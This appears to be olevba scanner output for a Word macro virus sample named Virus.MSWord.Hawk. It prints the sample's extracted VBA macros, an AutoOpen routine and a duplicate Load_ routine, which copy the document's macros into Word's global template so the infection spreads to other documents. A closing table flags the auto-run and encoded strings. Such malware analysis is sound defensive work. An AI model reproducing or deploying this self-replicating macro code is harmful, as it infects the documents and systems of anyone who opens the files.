olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Hawk
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Hawk - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: Virus.MSWord.Hawk - OLE stream: 'Macros/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim how_many
Dim i
Dim loaded
Dim new_$
Dim macr_new$
how_many = WordBasic.CountMacros(0, 0)
For i = 1 To how_many
    Select Case WordBasic.[MacroName$](i, 0, 0)
    Case "FileOpen"
        loaded = -1
    Case "Load"
        loaded = -1
    Case Else
    End Select
Next i
If Not loaded Then
    new_$ = WordBasic.[FileName$]()
    macr_new$ = new_$ + ":AutoOpen"
    WordBasic.MacroCopy macr_new$, "Global:Load"
    macr_new$ = new_$ + ":FileOpen"
    WordBasic.MacroCopy macr_new$, "Global:FileOpen"
End If

End Sub
-------------------------------------------------------------------------------
VBA MACRO Load_.bas 
in file: Virus.MSWord.Hawk - OLE stream: 'Macros/VBA/Load_'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim how_many
Dim i
Dim loaded
Dim new_$
Dim macr_new$
how_many = WordBasic.CountMacros(0, 0)
For i = 1 To how_many
    Select Case WordBasic.[MacroName$](i, 0, 0)
    Case "FileOpen"
        loaded = -1
    Case "Load"
        loaded = -1
    Case Else
    End Select
Next i
If Not loaded Then
    new_$ = WordBasic.[FileName$]()
    macr_new$ = new_$ + ":AutoOpen"
    WordBasic.MacroCopy macr_new$, "Global:Load"
    macr_new$ = new_$ + ":FileOpen"
    WordBasic.MacroCopy macr_new$, "Global:FileOpen"
End If

End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

